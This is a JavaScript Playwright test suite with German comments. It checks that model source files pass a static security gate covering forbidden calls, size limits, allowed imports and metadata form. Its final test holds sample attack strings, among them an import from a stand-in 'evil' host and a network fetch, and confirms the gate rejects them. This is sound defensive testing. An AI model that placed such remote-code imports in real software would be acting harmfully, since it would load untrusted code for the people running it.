/**
 * S1-Suite (Node-Seite): Verbote, Groesse, Imports, Meta-Form ueber alle Modelle.
 * Bauplan Abschnitt 6 (S1) und Abschnitt 8 (verify:static).
 */
import { test, expect } from '@playwright/test';
import { readdir, readFile } from 'node:fs/promises';
import { existsSync } from 'node:fs';
import { staticGate, checkMeta } from '../src/runtime/guard-static.js';
import { extractMeta } from '../src/runtime/verify.js';

async function modelSources() {
  const dir = 'src/models';
  if (!existsSync(dir)) return [];
  const out = [];
  for (const f of await readdir(dir)) {
    if (f.endsWith('.js')) out.push({ id: f.slice(0, -3), source: await readFile(`${dir}/${f}`, 'utf8') });
  }
  return out;
}

test('S1: Modelle vorhanden', async () => {
  const models = await modelSources();
  expect(models.length, 'mindestens 1 Modell').toBeGreaterThan(0);
});

test('S1: keine Verbots-Treffer, Groesse ok, Imports allowlist', async () => {
  for (const m of await modelSources()) {
    const gate = staticGate(m.source, { comfort: 1500000, hard: 2000000 });
    expect(gate.hits, `${m.id}: Verbote ${JSON.stringify(gate.hits.slice(0, 2))}`).toEqual([]);
    expect(gate.size.tier, `${m.id}: Groesse`).not.toBe('reject');
    expect(gate.imports.ok, `${m.id}: fremde Imports ${gate.imports.offending}`).toBe(true);
  }
});

test('S1: Meta-Form gueltig', async () => {
  for (const m of await modelSources()) {
    const meta = extractMeta(m.source);
    expect(meta, `${m.id}: meta extrahierbar`).not.toBeNull();
    const v = checkMeta(meta);
    expect(v.ok, `${m.id}: missing=${v.missing} invalid=${v.invalid}`).toBe(true);
  }
});

test('S1: Verbots-Angriffe werden abgelehnt', async () => {
  const attacks = [
    'export const meta={}; export function init(){ fetch("http://x"); }',
    'export const meta={}; export function init(c){ document.body.innerHTML="x"; }',
    'import x from "http://evil/x.js"; export const meta=x; export function init(){ }',
  ];
  for (const [i, src] of attacks.entries()) {
    const gate = staticGate(src, {});
    expect(gate.hits.length > 0 || !gate.imports.ok, `Angriff ${i} abgelehnt`).toBe(true);
  }
});
